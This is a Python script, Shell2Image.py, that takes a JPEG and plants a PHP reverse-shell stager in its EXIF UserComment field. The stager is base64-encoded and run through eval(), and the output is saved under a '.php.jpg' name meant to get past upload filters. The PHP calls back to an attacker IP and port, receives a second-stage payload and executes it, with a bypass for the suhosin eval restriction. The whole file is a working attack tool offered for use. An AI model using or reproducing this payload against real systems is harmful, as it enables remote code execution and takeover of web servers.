#! /usr/bin/python3

import io
from PIL import Image
import piexif
import sys
import argparse
import base64

parser = argparse.ArgumentParser(description="Generate PHP Reverse Shell Image (JPEG)")
parser = argparse.ArgumentParser(add_help=False)
requiredArgs = parser.add_argument_group("Required Arguments")
requiredArgs.add_argument("-i", "--image", type=str, default="", metavar="", help="Image File to Convert (Required)")
requiredArgs.add_argument("-a", "--ipaddr", type=str, default="", metavar="", help="Attacker IP (Required)")

optionalArgs = parser.add_argument_group("Optional Arguments")
optionalArgs.add_argument("-p", "--port", type=int, default=21, metavar="", help="Port [default:21]")
optionalArgs.add_argument("-o", "--outfilename", type=str, default="", metavar="", help="Use a Different Name to Original Image")
optionalArgs.add_argument("-h", "--help", action="store_true", help="Show Help")
args = parser.parse_args()

def show_help(msg = ""):
    if(msg != ""):
        print("\n" + msg + "\n")

    print("\nGenerate PHP Reverse Shell Image (JPEG)\n")
    print("------------------------------------------------")
    print("Required Arguments")
    print("------------------------------------------------")
    print("-i,  --image        Image File to Convert (Required)")
    print("-a,  --ipaddr       Attacker IP (Required)")
    print("------------------------------------------------")
    print("Optional Arguments")
    print("------------------------------------------------")
    print("-p,  --port         Attacker Port [default:21]")
    print("-o,  --outfilename  Use a Different Name to Original Image")
    print("-h,  --help         Show Help")
    print("------------------------------------------------")
    print("\n")
    print("Syntax")
    print("------------------------------------------------------------------------------------------------------------------------------")
    print("python3 Shell2Image.py --image=\"image.jpeg\" --ipaddr\"<IP>\" --port\"<PORT>\" --outfilename\"newimage.jpg\"")
    print("python3 Shell2Image.py --image=\"image.jpeg\" --ipaddr\"<IP>\" --port\"<PORT>\"")
    print("python3 Shell2Image.py --image=\"image.jpeg\" --ipaddr\"<IP>\"")
    print("------------------------------------------------------------------------------------------------------------------------------\n")
    sys.exit()


if(args.help):
    show_help() 

if(args.image == "" or args.ipaddr == ""):
    show_help("Error missing arguments!")


def build_exploit_string(ipaddr, port):
    exploit = """
        if (($f = 'stream_socket_client') && is_callable($f)) {     
            $s = $f("tcp://{$ip}:{$port}");       
            $s_type = 'stream'; 
        } 
        if (!$s && ($f = 'fsockopen') && is_callable($f)) {     
            $s = $f($ip, $port);     
            $s_type = 'stream'; 
        } 
        if (!$s && ($f = 'socket_create') && is_callable($f)) {     
            $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);     
            $res = @socket_connect($s, $ip, $port);     
            if (!$res) {         
                die();     
            }     
            $s_type = 'socket'; 
        } 
        if (!$s_type) {     
            die('no socket funcs'); 
        } 
        if (!$s) {     
            die('no socket'); 
        } 
        switch ($s_type) {     
            case 'stream':         
            $len = fread($s, 4);     
            break;     
            case 'socket':         
            $len = socket_read($s, 4);     
            break; } 
        if (!$len) {     
            die(); 
        } 
        $a = unpack('Nlen', $len); $len = $a['len']; $b = ''; 
        while (strlen($b) < $len) {     
            switch ($s_type) {         
                case 'stream':         
                $b .= fread($s, $len-strlen($b));         
                break;         
                case 'socket':         
                $b .= socket_read($s, $len-strlen($b));         
                break;     
            } 
        }
        $GLOBALS['msgsock'] = $s; 
        $GLOBALS['msgsock_type'] = $s_type; 
        if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) {     
            $suhosin_bypass=create_function('', $b);     
            $suhosin_bypass(); 
        } else {     
            eval($b); 
        } 
        die();
    """
    
    exploitString = "$ip='" + ipaddr + "';"
    exploitString += "$port='" + str(port) + "';"
    exploitString += exploit

    encoded = base64.standard_b64encode(bytes(exploitString, 'UTF-8')).decode("UTF-8")
    string = "<?php $encoded='" + encoded + "'; $unencoded=base64_decode($encoded); eval($unencoded); ?>"
    return string.encode()


# Build and add exploit to the UserComment Exif Data
exif_ifd = {
    piexif.ExifIFD.UserComment: build_exploit_string(args.ipaddr, args.port)
}
exif_dict = {"Exif":exif_ifd}

# Convert to bytes
exif_bytes = piexif.dump(exif_dict)

#Saving Image
img = Image.open(args.image)

outfilename = ""

if(args.outfilename == ""):
    outfilename = str(args.image).split(".")[0]
else:
    outfilename = str(args.outfilename).split(".")[0]

img.save(outfilename + ".php.jpg", exif=exif_bytes)

